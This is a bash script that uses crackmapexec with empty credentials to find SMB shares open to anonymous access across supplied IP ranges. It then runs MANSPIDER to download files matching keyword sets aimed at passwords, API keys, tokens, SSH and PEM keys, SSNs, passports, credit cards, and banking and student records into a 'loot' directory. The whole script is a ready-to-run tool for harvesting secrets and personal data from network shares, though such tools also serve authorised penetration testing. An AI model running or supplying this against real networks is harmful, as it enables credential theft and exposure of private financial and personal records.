#!/bin/bash

# Default file extensions (used for all pre-made options unless overridden)
DEFAULT_EXTENSIONS="txt doc docx xls xlsx csv db bat com vbs ps1 psd1 psm1 pem key rsa pub reg cfg conf"

# Pre-made keyword sets
KEYWORDS_A="passw user admin account network login logon api_key access_key token cred SSN passport social_security drivers_license creditcard credit_card certificate pem ssh vpn classified confidential internal_use_only"
KEYWORDS_B="account bank routing swift iban transaction credit debit balance statement finance loan mortgage payment atm pin fraud cheque wire beneficiary ledger reconciliation"
KEYWORDS_C="student grade transcript enrollment syllabus professor teacher course assignment exam gpa attendance scholarship bursary tuition academic diploma degree registrar"

# Default loot directory
DEFAULT_LOOT_DIR="$HOME/manspider_loot"

# Usage help function
usage() {
    echo "Usage: $0 -i <ip_range_file> [-l <loot_dir>] [-e <extensions>] [-k <keyword_set>]"
    echo "Options:"
    echo "  -i <file>      Path to file containing IP ranges (required)"
    echo "  -l <dir>       Directory to store looted files (default: $DEFAULT_LOOT_DIR)"
    echo "  -e <exts>      Space-separated file extensions to search (default: $DEFAULT_EXTENSIONS)"
    echo "  -k <set>       Keyword set: A (standard), B (banking), C (education), or custom keywords (default: A)"
    echo "                 Examples:"
    echo "                   -k A  : Standard keywords ($KEYWORDS_A)"
    echo "                   -k B  : Banking keywords ($KEYWORDS_B)"
    echo "                   -k C  : Education keywords ($KEYWORDS_C)"
    echo "                   -k \"custom keywords\" : Custom space-separated keywords"
    echo "  -h, -help      Show this help message"
    exit 1
}

# Check for -help or --help before getopts
if [[ "$1" == "-help" || "$1" == "--help" ]]; then
    usage
fi

# Parse command-line arguments
while getopts "i:l:e:k:h" opt; do
    case "$opt" in
        i) IP_FILE="$OPTARG" ;;
        l) LOOT_DIR="$OPTARG" ;;
        e) EXTENSIONS="$OPTARG" ;;
        k) KEYWORD_SET="$OPTARG" ;;
        h) usage ;;
        ?) usage ;;
    esac
done

# Check if IP file was provided
if [ -z "$IP_FILE" ]; then
    echo "Error: IP range file is required (-i)"
    usage
fi

# Validate IP file exists
if [ ! -f "$IP_FILE" ]; then
    echo "Error: File not found: $IP_FILE"
    exit 1
fi

# Set defaults if not provided
LOOT_DIR="${LOOT_DIR:-$DEFAULT_LOOT_DIR}"
EXTENSIONS="${EXTENSIONS:-$DEFAULT_EXTENSIONS}"

# Determine keyword set
case "$KEYWORD_SET" in
    "A"|"a"|"") KEYWORDS="$KEYWORDS_A" ;;  # Default to A if unspecified
    "B"|"b") KEYWORDS="$KEYWORDS_B" ;;
    "C"|"c") KEYWORDS="$KEYWORDS_C" ;;
    *) KEYWORDS="$KEYWORD_SET" ;;  # Anything else is treated as custom keywords
esac

# Define output file for discovered hosts
OUTPUT_FILE="spider-hosts.txt"

# Clear previous output file
> "$OUTPUT_FILE"

# Step 1: Scan for accessible SMB shares
echo "Scanning IP ranges from $IP_FILE for accessible SMB shares..."
while IFS= read -r ip_range; do
    echo "Scanning $ip_range..."
    crackmapexec smb "$ip_range" -u '' -p '' --shares | awk '/READ|WRITE/ && !/READONLY/ {print $2}' >> "$OUTPUT_FILE"
done < "$IP_FILE"

# Remove duplicates from the host list
sort -u "$OUTPUT_FILE" -o "$OUTPUT_FILE"

# Check if any hosts were found
if [ ! -s "$OUTPUT_FILE" ]; then
    echo "No accessible SMB shares found. Exiting."
    exit 0
fi

echo "Found $(wc -l < "$OUTPUT_FILE") hosts with accessible SMB shares. Starting spidering..."

# Step 2: Spider the shares with MANSPIDER
mkdir -p "$LOOT_DIR"

while IFS= read -r ip; do
    echo "Spidering $ip with keywords: $KEYWORDS..."
    manspider -t 20 "$ip" -l "$LOOT_DIR" -f "$KEYWORDS" -e "$EXTENSIONS"
done < "$OUTPUT_FILE"

echo "Spidering complete. Loot saved to $LOOT_DIR"